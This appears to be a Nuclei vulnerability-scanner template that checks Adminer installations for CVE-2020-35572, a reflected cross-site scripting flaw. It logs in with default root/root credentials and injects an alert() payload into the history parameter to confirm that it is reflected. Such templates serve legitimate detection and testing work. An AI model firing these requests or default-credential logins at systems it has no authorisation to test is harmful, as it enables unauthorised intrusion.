---
id: CVE-2020-35572
info:
  name: CVE-2020-35572
  author: Matt Galligan
  severity: Medium
  reference:
    - https://www.cvedetails.com/cve/CVE-2020-35572/
    - https://sourceforge.net/p/adminer/bugs-and-features/775/
  tags: cve,2020,adminer
variables:
  xss_payload: "{{rand_text_alpha(10)}}"
  user: root
  pass: root
  server_ip: localhost
requests:
  - raw:
      - |
        GET {{path}} HTTP/1.1
        Host: {{Hostname}}
      - >
        POST {{path}} HTTP/1.1

        Host: {{Hostname}}

        Content-Type: application/x-www-form-urlencoded


        auth%5Bdriver%5D=server&auth%5Bserver%5D={{server_ip}}&auth%5Busername%5D={{user}}&auth%5Bpassword%5D={{pass}}&auth%5Bdb%5D=
      - >
        GET
        {{path}}?server={{server_ip}}&username={{user}}&sql=&history='+alert('{{xss_payload}}')+'&foo=bar
        HTTP/1.1

        Host: {{Hostname}}
    payloads:
      path:
        - "{{BaseURL}}"
        - "{{BaseURL}}/adminer/"
        - "{{BaseURL}}/adminer.php"
    stop-at-first-match: true
    host-redirects: true
    cookie-reuse: true
    req-condition: true
    max-redirects: 2
    matchers:
      - type: dsl
        dsl:
          - status_code_1 == 200
          - contains(body_1,'Adminer')
          - status_code_2 == 302
          - status_code_3 == 200
          - contains(body_3, '&history=\'+alert(\'{{xss_payload}}\')+\'')
        condition: and
